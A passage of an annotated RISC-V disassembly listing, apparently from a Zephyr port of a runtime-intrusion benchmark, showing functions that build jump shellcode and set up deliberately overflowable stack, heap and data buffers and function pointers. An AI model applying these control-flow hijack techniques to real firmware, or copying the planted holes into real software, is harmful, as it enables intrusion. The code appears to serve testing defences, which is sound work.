800010b6:	8000c7b7          	lui	a5,0x8000c
800010ba:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800010be:	c63a                	sw	a4,12(sp)
800010c0:	4701                	li	a4,0
    char insn_bytes[4];

    insn_bytes[0] = (insn >> 24) & 0xff;
800010c2:	0185d793          	srli	a5,a1,0x18
800010c6:	00f10423          	sb	a5,8(sp)
    insn_bytes[1] = (insn >> 16) & 0xff;
800010ca:	0105d793          	srli	a5,a1,0x10
800010ce:	00f104a3          	sb	a5,9(sp)
    insn_bytes[2] = (insn >> 8) & 0xff;
800010d2:	0085d793          	srli	a5,a1,0x8
800010d6:	00f10523          	sb	a5,10(sp)
    insn_bytes[3] = insn & 0xff;
800010da:	00b105a3          	sb	a1,11(sp)

    for (int i = 3; i >= 0; i--) {
800010de:	470d                	li	a4,3
800010e0:	a821                	j	800010f8 <format_instruction+0x46>
        dest[3 - i] = insn_bytes[i];
800010e2:	478d                	li	a5,3
800010e4:	8f99                	sub	a5,a5,a4
800010e6:	97aa                	add	a5,a5,a0
800010e8:	01070693          	addi	a3,a4,16
800010ec:	968a                	add	a3,a3,sp
800010ee:	ff86c683          	lbu	a3,-8(a3)
800010f2:	00d78023          	sb	a3,0(a5)
    for (int i = 3; i >= 0; i--) {
800010f6:	177d                	addi	a4,a4,-1
800010f8:	fe0755e3          	bgez	a4,800010e2 <format_instruction+0x30>
    }
}
800010fc:	8000c7b7          	lui	a5,0x8000c
80001100:	4732                	lw	a4,12(sp)
80001102:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80001106:	8fb9                	xor	a5,a5,a4
80001108:	4701                	li	a4,0
8000110a:	e781                	bnez	a5,80001112 <format_instruction+0x60>
8000110c:	40f2                	lw	ra,28(sp)
8000110e:	6105                	addi	sp,sp,32
80001110:	8082                	ret
80001112:	3e1040ef          	jal	ra,80005cf2 <_StackCheckHandler>

80001116 <build_shellcode>:
{
80001116:	7135                	addi	sp,sp,-160
80001118:	cf06                	sw	ra,156(sp)
8000111a:	cd22                	sw	s0,152(sp)
8000111c:	cb26                	sw	s1,148(sp)
8000111e:	c94a                	sw	s2,144(sp)
80001120:	c74e                	sw	s3,140(sp)
80001122:	84aa                	mv	s1,a0
80001124:	8000c7b7          	lui	a5,0x8000c
80001128:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000112c:	deba                	sw	a4,124(sp)
8000112e:	4701                	li	a4,0
    memset(attack_addr, 0, sizeof(attack_addr) );
80001130:	c802                	sw	zero,16(sp)
80001132:	ca02                	sw	zero,20(sp)
80001134:	00010c23          	sb	zero,24(sp)
    memset(low_bits,    0, sizeof(low_bits) );
80001138:	c202                	sw	zero,4(sp)
    memset(high_bits,   0, sizeof(high_bits) );
8000113a:	c402                	sw	zero,8(sp)
8000113c:	00011623          	sh	zero,12(sp)
    memset(lui_bin,     0, sizeof(lui_bin) );
80001140:	da02                	sw	zero,52(sp)
80001142:	dc02                	sw	zero,56(sp)
80001144:	de02                	sw	zero,60(sp)
80001146:	c082                	sw	zero,64(sp)
80001148:	c282                	sw	zero,68(sp)
8000114a:	c482                	sw	zero,72(sp)
8000114c:	c682                	sw	zero,76(sp)
8000114e:	c882                	sw	zero,80(sp)
80001150:	04010a23          	sb	zero,84(sp)
    memset(addi_bin,    0, sizeof(addi_bin) );
80001154:	cc82                	sw	zero,88(sp)
80001156:	ce82                	sw	zero,92(sp)
80001158:	d082                	sw	zero,96(sp)
8000115a:	d282                	sw	zero,100(sp)
8000115c:	d482                	sw	zero,104(sp)
8000115e:	d682                	sw	zero,108(sp)
80001160:	d882                	sw	zero,112(sp)
80001162:	da82                	sw	zero,116(sp)
80001164:	06010c23          	sb	zero,120(sp)
    memset(lui_s,       0, sizeof(lui_s) );
80001168:	ce02                	sw	zero,28(sp)
8000116a:	d002                	sw	zero,32(sp)
8000116c:	02010223          	sb	zero,36(sp)
    memset(addi_s,      0, sizeof(addi_s) );
80001170:	d402                	sw	zero,40(sp)
80001172:	d602                	sw	zero,44(sp)
80001174:	02010823          	sb	zero,48(sp)
	if (((unsigned long)&shellcode_target & 0x00000fff) >= 0x800)
80001178:	800015b7          	lui	a1,0x80001
8000117c:	b5658593          	addi	a1,a1,-1194 # 80000b56 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80000b57>
80001180:	6785                	lui	a5,0x1
80001182:	80078793          	addi	a5,a5,-2048 # 800 <CONFIG_NEWLIB_LIBC_MIN_REQUIRED_HEAP_SIZE>
80001186:	8fed                	and	a5,a5,a1
80001188:	cf8d                	beqz	a5,800011c2 <build_shellcode+0xac>
		hex_to_string(attack_addr, &shellcode_target + 0x1000);
8000118a:	800025b7          	lui	a1,0x80002
8000118e:	b5658593          	addi	a1,a1,-1194 # 80001b56 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80001b57>
80001192:	0808                	addi	a0,sp,16
80001194:	3d65                	jal	8000104c <hex_to_string>
    strncpy(low_bits, &attack_addr[5], 3);
80001196:	460d                	li	a2,3
80001198:	01510593          	addi	a1,sp,21
8000119c:	0048                	addi	a0,sp,4
8000119e:	442050ef          	jal	ra,800065e0 <strncpy>
    strncpy(high_bits, attack_addr, 5);
800011a2:	4615                	li	a2,5
800011a4:	080c                	addi	a1,sp,16
800011a6:	0028                	addi	a0,sp,8
800011a8:	438050ef          	jal	ra,800065e0 <strncpy>
    jalr_val = strtoul(jalr_s, 0, 16);
800011ac:	4641                	li	a2,16
800011ae:	4581                	li	a1,0
800011b0:	80007537          	lui	a0,0x80007
800011b4:	3c450513          	addi	a0,a0,964 # 800073c4 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800073c5>
800011b8:	57c050ef          	jal	ra,80006734 <strtoul>
800011bc:	892a                	mv	s2,a0
    for (int i = 0; i < 5; i++) {
800011be:	4401                	li	s0,0
800011c0:	a015                	j	800011e4 <build_shellcode+0xce>
		hex_to_string(attack_addr, &shellcode_target);
800011c2:	0808                	addi	a0,sp,16
800011c4:	3561                	jal	8000104c <hex_to_string>
800011c6:	bfc1                	j	80001196 <build_shellcode+0x80>
        strncat(lui_bin, hex_to_bin(high_bits[i]), 4);
800011c8:	08040793          	addi	a5,s0,128
800011cc:	978a                	add	a5,a5,sp
800011ce:	f887c503          	lbu	a0,-120(a5)
800011d2:	32ed                	jal	80000bbc <hex_to_bin>
800011d4:	85aa                	mv	a1,a0
800011d6:	02100693          	li	a3,33
800011da:	4611                	li	a2,4
800011dc:	1848                	addi	a0,sp,52
800011de:	3bc050ef          	jal	ra,8000659a <__strncat_chk>
    for (int i = 0; i < 5; i++) {
800011e2:	0405                	addi	s0,s0,1
800011e4:	4791                	li	a5,4
800011e6:	fe87d1e3          	bge	a5,s0,800011c8 <build_shellcode+0xb2>
    strncat(lui_bin, "001100110111", 12);
800011ea:	02100613          	li	a2,33
800011ee:	800075b7          	lui	a1,0x80007
800011f2:	3d058593          	addi	a1,a1,976 # 800073d0 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800073d1>
800011f6:	1848                	addi	a0,sp,52
800011f8:	2cc050ef          	jal	ra,800064c4 <__strcat_chk>
    lui_val = strtoul(lui_bin, 0, 2);
800011fc:	4609                	li	a2,2
800011fe:	4581                	li	a1,0
80001200:	1848                	addi	a0,sp,52
80001202:	532050ef          	jal	ra,80006734 <strtoul>
80001206:	89aa                	mv	s3,a0
    hex_to_string(lui_s, lui_val);
80001208:	85aa                	mv	a1,a0
8000120a:	0868                	addi	a0,sp,28
8000120c:	3581                	jal	8000104c <hex_to_string>
    for (int i = 0; i < 3; i++) {
8000120e:	4401                	li	s0,0
80001210:	a839                	j	8000122e <build_shellcode+0x118>
        strncat(addi_bin, hex_to_bin(low_bits[i]), 4);
80001212:	08040793          	addi	a5,s0,128
80001216:	978a                	add	a5,a5,sp
80001218:	f847c503          	lbu	a0,-124(a5)
8000121c:	3245                	jal	80000bbc <hex_to_bin>
8000121e:	85aa                	mv	a1,a0
80001220:	02100693          	li	a3,33
80001224:	4611                	li	a2,4
80001226:	08a8                	addi	a0,sp,88
80001228:	372050ef          	jal	ra,8000659a <__strncat_chk>
    for (int i = 0; i < 3; i++) {
8000122c:	0405                	addi	s0,s0,1
8000122e:	4789                	li	a5,2
80001230:	fe87d1e3          	bge	a5,s0,80001212 <build_shellcode+0xfc>
    strncat(addi_bin, "00110000001100010011", 20);
80001234:	02100613          	li	a2,33
80001238:	800075b7          	lui	a1,0x80007
8000123c:	3e058593          	addi	a1,a1,992 # 800073e0 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800073e1>
80001240:	08a8                	addi	a0,sp,88
80001242:	282050ef          	jal	ra,800064c4 <__strcat_chk>
    addi_val = strtoul(addi_bin, 0, 2);
80001246:	4609                	li	a2,2
80001248:	4581                	li	a1,0
8000124a:	08a8                	addi	a0,sp,88
8000124c:	4e8050ef          	jal	ra,80006734 <strtoul>
80001250:	842a                	mv	s0,a0
    hex_to_string(addi_s, addi_val);
80001252:	85aa                	mv	a1,a0
80001254:	1028                	addi	a0,sp,40
80001256:	3bdd                	jal	8000104c <hex_to_string>
    format_instruction(shellcode, lui_val);
80001258:	85ce                	mv	a1,s3
8000125a:	8526                	mv	a0,s1
8000125c:	3d99                	jal	800010b2 <format_instruction>
    format_instruction(shellcode + 4, addi_val);
8000125e:	85a2                	mv	a1,s0
80001260:	00448513          	addi	a0,s1,4
80001264:	35b9                	jal	800010b2 <format_instruction>
    format_instruction(shellcode + 8, jalr_val);
80001266:	85ca                	mv	a1,s2
80001268:	00848513          	addi	a0,s1,8
8000126c:	3599                	jal	800010b2 <format_instruction>
    hex_to_string(lui_s, lui_val);
8000126e:	85ce                	mv	a1,s3
80001270:	0868                	addi	a0,sp,28
80001272:	3be9                	jal	8000104c <hex_to_string>
    hex_to_string(addi_s, addi_val);
80001274:	85a2                	mv	a1,s0
80001276:	1028                	addi	a0,sp,40
80001278:	3bd1                	jal	8000104c <hex_to_string>
        printf("----------------\nShellcode instructions:\n");
8000127a:	80007537          	lui	a0,0x80007
8000127e:	3f850513          	addi	a0,a0,1016 # 800073f8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800073f9>
80001282:	14e010ef          	jal	ra,800023d0 <printk>
        printf("%s0x%-20s%14s\n", "lui t1,  ", high_bits, lui_s);
80001286:	0874                	addi	a3,sp,28
80001288:	0030                	addi	a2,sp,8
8000128a:	800075b7          	lui	a1,0x80007
8000128e:	42458593          	addi	a1,a1,1060 # 80007424 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007425>
80001292:	80007537          	lui	a0,0x80007
80001296:	43050513          	addi	a0,a0,1072 # 80007430 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007431>
8000129a:	136010ef          	jal	ra,800023d0 <printk>
        printf("%s0x%-20s%10s\n", "addi t1, t1, ", low_bits, addi_s);
8000129e:	1034                	addi	a3,sp,40
800012a0:	0050                	addi	a2,sp,4
800012a2:	800075b7          	lui	a1,0x80007
800012a6:	44058593          	addi	a1,a1,1088 # 80007440 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007441>
800012aa:	80007537          	lui	a0,0x80007
800012ae:	45050513          	addi	a0,a0,1104 # 80007450 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007451>
800012b2:	11e010ef          	jal	ra,800023d0 <printk>
        printf("%s%38s\n----------------\n", "jalr t1", jalr_s);
800012b6:	80007637          	lui	a2,0x80007
800012ba:	3c460613          	addi	a2,a2,964 # 800073c4 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800073c5>
800012be:	800075b7          	lui	a1,0x80007
800012c2:	46058593          	addi	a1,a1,1120 # 80007460 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007461>
800012c6:	80007537          	lui	a0,0x80007
800012ca:	46850513          	addi	a0,a0,1128 # 80007468 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007469>
800012ce:	102010ef          	jal	ra,800023d0 <printk>
} /* build_shellcode */
800012d2:	8000c7b7          	lui	a5,0x8000c
800012d6:	5776                	lw	a4,124(sp)
800012d8:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800012dc:	8fb9                	xor	a5,a5,a4
800012de:	4701                	li	a4,0
800012e0:	eb81                	bnez	a5,800012f0 <build_shellcode+0x1da>
800012e2:	40fa                	lw	ra,156(sp)
800012e4:	446a                	lw	s0,152(sp)
800012e6:	44da                	lw	s1,148(sp)
800012e8:	494a                	lw	s2,144(sp)
800012ea:	49ba                	lw	s3,140(sp)
800012ec:	610d                	addi	sp,sp,160
800012ee:	8082                	ret
800012f0:	203040ef          	jal	ra,80005cf2 <_StackCheckHandler>

800012f4 <perform_attack>:
{
800012f4:	90010113          	addi	sp,sp,-1792
800012f8:	6e112e23          	sw	ra,1788(sp)
800012fc:	6e812c23          	sw	s0,1784(sp)
80001300:	6e912a23          	sw	s1,1780(sp)
80001304:	6f212823          	sw	s2,1776(sp)
80001308:	6f312623          	sw	s3,1772(sp)
8000130c:	6f412423          	sw	s4,1768(sp)
80001310:	70010413          	addi	s0,sp,1792
80001314:	92a42623          	sw	a0,-1748(s0)
80001318:	92b42423          	sw	a1,-1752(s0)
8000131c:	8000c7b7          	lui	a5,0x8000c
80001320:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80001324:	fce42e23          	sw	a4,-36(s0)
80001328:	4701                	li	a4,0
	strcpy(stack_secret, data_secret);
8000132a:	02000613          	li	a2,32
8000132e:	8000c5b7          	lui	a1,0x8000c
80001332:	c8858593          	addi	a1,a1,-888 # 8000bc88 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bc89>
80001336:	bbc40513          	addi	a0,s0,-1092
8000133a:	1da050ef          	jal	ra,80006514 <__strcpy_chk>
    stack_struct.func_ptr = &dummy_function;
8000133e:	800014b7          	lui	s1,0x80001
80001342:	b1e48493          	addi	s1,s1,-1250 # 80000b1e <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80000b1f>
80001346:	a6942a23          	sw	s1,-1420(s0)
      (struct attackme *) malloc(sizeof(struct attackme));
8000134a:	10400513          	li	a0,260
8000134e:	73b040ef          	jal	ra,80006288 <malloc>
80001352:	90a42e23          	sw	a0,-1764(s0)
    heap_struct->func_ptr = dummy_function;
80001356:	10952023          	sw	s1,256(a0)
    char * heap_buffer1 = (char *) malloc(256 + sizeof(long));
8000135a:	10400513          	li	a0,260
8000135e:	72b040ef          	jal	ra,80006288 <malloc>
80001362:	84aa                	mv	s1,a0
    char * heap_buffer2 = (char *) malloc(256 + sizeof(long));
80001364:	10400513          	li	a0,260
80001368:	721040ef          	jal	ra,80006288 <malloc>
8000136c:	892a                	mv	s2,a0
    char * heap_buffer3 = (char *) malloc(256 + sizeof(long));
8000136e:	10400513          	li	a0,260
80001372:	717040ef          	jal	ra,80006288 <malloc>
80001376:	8a2a                	mv	s4,a0
    int * heap_flag = (int *) malloc(sizeof(int *));
80001378:	4511                	li	a0,4
8000137a:	70f040ef          	jal	ra,80006288 <malloc>
    int(**heap_func_ptr)(const char *) = 0;
8000137e:	92042223          	sw	zero,-1756(s0)
    if (heap_buffer1 == NULL || heap_buffer2 == NULL) {
80001382:	c0d1                	beqz	s1,80001406 <perform_attack+0x112>
80001384:	89aa                	mv	s3,a0
80001386:	08090063          	beqz	s2,80001406 <perform_attack+0x112>
    bss_buffer[0]  = 'a';
8000138a:	800097b7          	lui	a5,0x80009
8000138e:	06100713          	li	a4,97
80001392:	3ce78e23          	sb	a4,988(a5) # 800093dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800093dd>
  	strcpy(bss_secret, data_secret);
80001396:	02000613          	li	a2,32
8000139a:	8000c5b7          	lui	a1,0x8000c
8000139e:	c8858593          	addi	a1,a1,-888 # 8000bc88 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bc89>
800013a2:	80009537          	lui	a0,0x80009
800013a6:	3bc50513          	addi	a0,a0,956 # 800093bc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800093bd>
800013aa:	16a050ef          	jal	ra,80006514 <__strcpy_chk>
    build_shellcode(shellcode_nonop);
800013ae:	80009537          	lui	a0,0x80009
800013b2:	4f050513          	addi	a0,a0,1264 # 800094f0 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094f1>
800013b6:	3385                	jal	80001116 <build_shellcode>
    switch (attack.location) {
800013b8:	800097b7          	lui	a5,0x80009
800013bc:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
800013c0:	47dc                	lw	a5,12(a5)
800013c2:	19200713          	li	a4,402
800013c6:	22e78863          	beq	a5,a4,800015f6 <perform_attack+0x302>
800013ca:	04f76763          	bltu	a4,a5,80001418 <perform_attack+0x124>
800013ce:	19000713          	li	a4,400
800013d2:	08e78c63          	beq	a5,a4,8000146a <perform_attack+0x176>
800013d6:	19100713          	li	a4,401
800013da:	0ce79663          	bne	a5,a4,800014a6 <perform_attack+0x1b2>
            if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP &&
800013de:	800097b7          	lui	a5,0x80009
800013e2:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
800013e6:	479c                	lw	a5,8(a5)
800013e8:	13800713          	li	a4,312
800013ec:	14e78563          	beq	a5,a4,80001536 <perform_attack+0x242>
            if (((unsigned long) heap_buffer1 < (unsigned long) heap_buffer2) &&
800013f0:	1724e063          	bltu	s1,s2,80001550 <perform_attack+0x25c>
                    fprintf(stderr,
800013f4:	80007537          	lui	a0,0x80007
800013f8:	4a450513          	addi	a0,a0,1188 # 800074a4 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800074a5>
800013fc:	7d5000ef          	jal	ra,800023d0 <printk>
                exit(1);
80001400:	4505                	li	a0,1
80001402:	65b040ef          	jal	ra,8000625c <exit>
        printk("Unable to allocate heap memory.");
80001406:	80007537          	lui	a0,0x80007
8000140a:	48450513          	addi	a0,a0,1156 # 80007484 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007485>
8000140e:	7c3000ef          	jal	ra,800023d0 <printk>
        exit(1);
80001412:	4505                	li	a0,1
80001414:	649040ef          	jal	ra,8000625c <exit>
    switch (attack.location) {
80001418:	19300713          	li	a4,403
8000141c:	08e79563          	bne	a5,a4,800014a6 <perform_attack+0x1b2>
            if (attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
80001420:	800097b7          	lui	a5,0x80009
80001424:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001428:	479c                	lw	a5,8(a5)
8000142a:	13900713          	li	a4,313
8000142e:	16e78f63          	beq	a5,a4,800015ac <perform_attack+0x2b8>
            if ((attack.code_ptr == FUNC_PTR_DATA ||
80001432:	13100713          	li	a4,305
80001436:	18e78263          	beq	a5,a4,800015ba <perform_attack+0x2c6>
8000143a:	13b00713          	li	a4,315
8000143e:	16e78e63          	beq	a5,a4,800015ba <perform_attack+0x2c6>
                buffer = data_buffer1;
80001442:	8000c7b7          	lui	a5,0x8000c
80001446:	ca878793          	addi	a5,a5,-856 # 8000bca8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bca9>
8000144a:	94f42423          	sw	a5,-1720(s0)
            if (attack.inject_param == DATA_ONLY) {
8000144e:	800097b7          	lui	a5,0x80009
80001452:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001456:	43d8                	lw	a4,4(a5)
80001458:	0cb00793          	li	a5,203
8000145c:	16f70e63          	beq	a4,a5,800015d8 <perform_attack+0x2e4>
            heap_jmp_buffer = heap_buffer1;
80001460:	90942c23          	sw	s1,-1768(s0)
            heap_func_ptr   = (void *) heap_buffer1;
80001464:	92942223          	sw	s1,-1756(s0)
80001468:	a83d                	j	800014a6 <perform_attack+0x1b2>
            if (attack.code_ptr == STRUCT_FUNC_PTR_STACK &&
8000146a:	800097b7          	lui	a5,0x80009
8000146e:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001472:	479c                	lw	a5,8(a5)
80001474:	13700713          	li	a4,311
80001478:	06e78d63          	beq	a5,a4,800014f2 <perform_attack+0x1fe>
            } else if (attack.code_ptr == FUNC_PTR_STACK_PARAM &&
8000147c:	12e00713          	li	a4,302
80001480:	08e78663          	beq	a5,a4,8000150c <perform_attack+0x218>
                buffer = stack_buffer;
80001484:	bdc40793          	addi	a5,s0,-1060
80001488:	94f42423          	sw	a5,-1720(s0)
            if (attack.inject_param == DATA_ONLY) {
8000148c:	800097b7          	lui	a5,0x80009
80001490:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001494:	43d8                	lw	a4,4(a5)
80001496:	0cb00793          	li	a5,203
8000149a:	08f70563          	beq	a4,a5,80001524 <perform_attack+0x230>
            heap_jmp_buffer = (void *) heap_buffer1;
8000149e:	90942c23          	sw	s1,-1768(s0)
            heap_func_ptr   = (void *) heap_buffer1;
800014a2:	92942223          	sw	s1,-1756(s0)
    if (heap_func_ptr)
800014a6:	92442703          	lw	a4,-1756(s0)
800014aa:	c711                	beqz	a4,800014b6 <perform_attack+0x1c2>
        *heap_func_ptr = dummy_function;
800014ac:	800017b7          	lui	a5,0x80001
800014b0:	b1e78793          	addi	a5,a5,-1250 # 80000b1e <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80000b1f>
800014b4:	c31c                	sw	a5,0(a4)
    switch (attack.technique) {
800014b6:	800097b7          	lui	a5,0x80009
800014ba:	4dc7a783          	lw	a5,1244(a5) # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
800014be:	06400713          	li	a4,100
800014c2:	1ae78e63          	beq	a5,a4,8000167e <perform_attack+0x38a>
800014c6:	06500713          	li	a4,101
800014ca:	30e78063          	beq	a5,a4,800017ca <perform_attack+0x4d6>
    switch (attack.code_ptr) {
800014ce:	800097b7          	lui	a5,0x80009
800014d2:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
800014d6:	479c                	lw	a5,8(a5)
800014d8:	ece78793          	addi	a5,a5,-306
800014dc:	4711                	li	a4,4
800014de:	3cf76b63          	bltu	a4,a5,800018b4 <perform_attack+0x5c0>
800014e2:	078a                	slli	a5,a5,0x2
800014e4:	80007737          	lui	a4,0x80007
800014e8:	65870713          	addi	a4,a4,1624 # 80007658 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007659>
800014ec:	97ba                	add	a5,a5,a4
800014ee:	439c                	lw	a5,0(a5)
800014f0:	8782                	jr	a5
              attack.technique == DIRECT)
800014f2:	80009737          	lui	a4,0x80009
800014f6:	4dc72683          	lw	a3,1244(a4) # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
            if (attack.code_ptr == STRUCT_FUNC_PTR_STACK &&
800014fa:	06400713          	li	a4,100
800014fe:	f6e69fe3          	bne	a3,a4,8000147c <perform_attack+0x188>
                buffer = stack_struct.buffer;
80001502:	97440793          	addi	a5,s0,-1676
80001506:	94f42423          	sw	a5,-1720(s0)
8000150a:	b749                	j	8000148c <perform_attack+0x198>
              attack.technique == DIRECT)
8000150c:	800097b7          	lui	a5,0x80009
80001510:	4dc7a703          	lw	a4,1244(a5) # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
            } else if (attack.code_ptr == FUNC_PTR_STACK_PARAM &&
80001514:	06400793          	li	a5,100
80001518:	f6f716e3          	bne	a4,a5,80001484 <perform_attack+0x190>
                set_low_buf(&buffer);
8000151c:	94840513          	addi	a0,s0,-1720
80001520:	3a41                	jal	80000eb0 <set_low_buf>
80001522:	b7ad                	j	8000148c <perform_attack+0x198>
                stack_mem_ptr = &stack_flag;
80001524:	94440793          	addi	a5,s0,-1724
80001528:	92f42e23          	sw	a5,-1732(s0)
            heap_jmp_buffer = (void *) heap_buffer1;
8000152c:	90942c23          	sw	s1,-1768(s0)
            heap_func_ptr   = (void *) heap_buffer1;
80001530:	92942223          	sw	s1,-1756(s0)
80001534:	bf8d                	j	800014a6 <perform_attack+0x1b2>
              attack.technique == DIRECT)
80001536:	80009737          	lui	a4,0x80009
8000153a:	4dc72683          	lw	a3,1244(a4) # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
            if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP &&
8000153e:	06400713          	li	a4,100
80001542:	eae697e3          	bne	a3,a4,800013f0 <perform_attack+0xfc>
                buffer = heap_struct->buffer;
80001546:	91c42783          	lw	a5,-1764(s0)
8000154a:	94f42423          	sw	a5,-1720(s0)
                break;
8000154e:	bfa1                	j	800014a6 <perform_attack+0x1b2>
            if (((unsigned long) heap_buffer1 < (unsigned long) heap_buffer2) &&
80001550:	eb4972e3          	bgeu	s2,s4,800013f4 <perform_attack+0x100>
                buffer = heap_buffer1;
80001554:	94942423          	sw	s1,-1720(s0)
                heap_mem_ptr_aux = (long *) heap_buffer2;
80001558:	91242823          	sw	s2,-1776(s0)
                heap_mem_ptr     = (long *) heap_buffer3;
8000155c:	91442623          	sw	s4,-1780(s0)
				if (attack.code_ptr == VAR_LEAK) {
80001560:	13d00713          	li	a4,317
80001564:	02e78a63          	beq	a5,a4,80001598 <perform_attack+0x2a4>
80001568:	4901                	li	s2,0
                heap_func_ptr = malloc(sizeof(void *));
8000156a:	4511                	li	a0,4
8000156c:	51d040ef          	jal	ra,80006288 <malloc>
80001570:	92a42223          	sw	a0,-1756(s0)
                heap_jmp_buffer = (int *) malloc(sizeof(jmp_buf));
80001574:	13000513          	li	a0,304
80001578:	511040ef          	jal	ra,80006288 <malloc>
            if (attack.inject_param == DATA_ONLY) {
8000157c:	80009737          	lui	a4,0x80009
80001580:	4dc70713          	addi	a4,a4,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80001584:	4354                	lw	a3,4(a4)
80001586:	0cb00713          	li	a4,203
8000158a:	0ee68363          	beq	a3,a4,80001670 <perform_attack+0x37c>
                heap_jmp_buffer = (int *) malloc(sizeof(jmp_buf));
8000158e:	90a42c23          	sw	a0,-1768(s0)
            if (attack.inject_param == DATA_ONLY) {
80001592:	93242023          	sw	s2,-1760(s0)
80001596:	bf01                	j	800014a6 <perform_attack+0x1b2>
					strcpy(heap_secret, data_secret);
80001598:	10400613          	li	a2,260
8000159c:	8000c5b7          	lui	a1,0x8000c
800015a0:	c8858593          	addi	a1,a1,-888 # 8000bc88 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bc89>
800015a4:	854a                	mv	a0,s2
800015a6:	76f040ef          	jal	ra,80006514 <__strcpy_chk>
800015aa:	b7c1                	j	8000156a <perform_attack+0x276>
                buffer = data_struct.buffer;
800015ac:	8000c7b7          	lui	a5,0x8000c
800015b0:	da878793          	addi	a5,a5,-600 # 8000bda8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bda9>
800015b4:	94f42423          	sw	a5,-1720(s0)
                break;
800015b8:	b5fd                	j	800014a6 <perform_attack+0x1b2>
              attack.technique == DIRECT)
800015ba:	800097b7          	lui	a5,0x80009
800015be:	4dc7a703          	lw	a4,1244(a5) # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
              attack.code_ptr == VAR_BOF) &&
800015c2:	06400793          	li	a5,100
800015c6:	e6f71ee3          	bne	a4,a5,80001442 <perform_attack+0x14e>
                buffer = data_buffer2;
800015ca:	8000c7b7          	lui	a5,0x8000c
800015ce:	ff078793          	addi	a5,a5,-16 # 8000bff0 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bff1>
800015d2:	94f42423          	sw	a5,-1720(s0)
800015d6:	bda5                	j	8000144e <perform_attack+0x15a>
                data_flag     = 0;
800015d8:	8000c7b7          	lui	a5,0x8000c
800015dc:	fe07a623          	sw	zero,-20(a5) # 8000bfec <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000bfed>
                *data_mem_ptr = &data_flag;
800015e0:	fec78793          	addi	a5,a5,-20
800015e4:	8000c737          	lui	a4,0x8000c
800015e8:	a8f72423          	sw	a5,-1400(a4) # 8000ba88 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000ba89>
            heap_jmp_buffer = heap_buffer1;
800015ec:	90942c23          	sw	s1,-1768(s0)
            heap_func_ptr   = (void *) heap_buffer1;
800015f0:	92942223          	sw	s1,-1756(s0)
800015f4:	bd4d                	j	800014a6 <perform_attack+0x1b2>
            if (attack.code_ptr == STRUCT_FUNC_PTR_BSS) {
800015f6:	800097b7          	lui	a5,0x80009
800015fa:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
800015fe:	4798                	lw	a4,8(a5)
80001600:	13a00793          	li	a5,314
80001604:	04f70463          	beq	a4,a5,8000164c <perform_attack+0x358>
            buffer = bss_buffer;
